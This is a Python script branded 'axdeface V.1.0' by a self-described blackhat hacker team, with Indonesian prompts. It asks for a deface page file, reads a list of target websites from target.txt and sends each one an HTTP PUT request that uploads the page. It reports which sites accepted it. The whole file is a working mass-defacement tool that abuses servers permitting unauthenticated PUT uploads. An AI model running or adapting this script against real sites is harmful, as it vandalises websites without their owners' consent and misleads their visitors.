#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")
import os 
os.system ("clear")
banner = """

\033[31m	 █████╗ ██╗  ██╗██████╗ \033[0m Author :\033[93m D J U N E K Z\033[0m
\033[31m	██╔══██╗╚██╗██╔╝██╔══██╗\033[0m Date   :\033[93m 2020-09-16\033[0m
\033[31m	███████║ ╚███╔╝ ██║  ██║\033[0m Tools  :\033[93m axdeface V.1.0\033[0m
\033[77m	██╔══██║ ██╔██╗ ██║  ██║\033[0m Github :\033[93m /djunekz\033[0m
\033[77m	██║  ██║██╔╝ ██╗██████╔╝\033[0m irssi  :\033[93m CyberPEJAYA\033[0m
\033[77m	╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ \033[0m Team   :\033[93m Surabaya BlackHat Hacker\033[0m
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def axd(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print ("\33[31m[\33[0;32m>\33[0m\33[31m]\33[0m Uploading file to \033[32m %d \033[0m website"%(len(target)))
      print ("\33[31m[\33[0;32m√\33[0m\33[31m]\33[0m Proses peretasan. . .")
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" FAILED!"+m+" ] \33[33;1m%s/%s"%(site,script))
            else:
               print(m+"["+h+" SUCCESS"+m+" ] \33[32;1m%s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("\33[31m[\33[0;32m>\33[0m\33[31m]\33[0m Ketik nama file script deface : ")
         if not os.path.isfile(a):
            print ("\33[31m[\33[0;32m!\33[0m\33[31m]\33[0m file\033[31m %s \033[0mtidak ada didalam folder ini. . ."%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   axd(a)

if __name__ == "__main__":
    main(banner)
